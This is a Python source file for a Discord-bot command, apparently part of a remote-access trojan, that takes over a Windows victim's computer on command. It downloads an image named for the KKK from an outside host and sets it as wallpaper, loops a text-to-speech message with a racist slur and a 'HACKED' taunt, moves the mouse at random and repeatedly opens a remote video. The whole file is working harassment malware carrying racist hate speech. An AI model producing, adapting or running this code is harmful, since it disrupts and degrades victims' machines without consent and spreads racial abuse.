import discord
from discord.ext import commands
import threading
import os
import ctypes
import time
import random
import pyautogui
import urllib.request

active_threads = []
stop_event = threading.Event() 

def change_wallpaper():
    wallpaper_url = "https://thugging.org/static/kkk.png"
    wallpaper_path = os.path.join(os.getenv('TEMP'), "kkk_wallpaper.png")
    urllib.request.urlretrieve(wallpaper_url, wallpaper_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

def tts():
    while not stop_event.is_set():
        os.system('powershell -c "Add-Type –AssemblyName System.speech; ' \
                  '$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; ' \
                  '$speak.Rate = 1; $speak.Volume = 100; ' \
                  '$speak.Speak(\'HACKED BY UTC THUGS GET GAPED BIGGERS\')"')
        time.sleep(1)

def move_mouse():
    while not stop_event.is_set(): 
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0.1)
        time.sleep(0.001) 

def open_video():
    while not stop_event.is_set():
        os.system('start "" "https://thugging.org/static/3.mp4"')
        time.sleep(1)

async def thug_bomb_action(ctx, action):
    global active_threads, stop_event
    if action == 'start':
        if not active_threads:
            stop_event.clear() 
            threading.Thread(target=change_wallpaper, daemon=True).start()
            threading.Thread(target=tts, daemon=True).start()
            threading.Thread(target=move_mouse, daemon=True).start()
            threading.Thread(target=open_video, daemon=True).start()
            active_threads.append('active')
            await ctx.send("Thug bomb activated! Enjoy the chaos! 😂")
        else:
            await ctx.send("Thug bomb is already active.")
    elif action == 'stop':
        stop_event.set()  
        active_threads.clear()  
        await ctx.send("Thug bomb deactivated!")

async def thugbomb_command(ctx, action: str):
    if action.lower() in ['start', 'stop']:
        await thug_bomb_action(ctx, action)
    else:
        await ctx.send("Please use `start` or `stop`.")
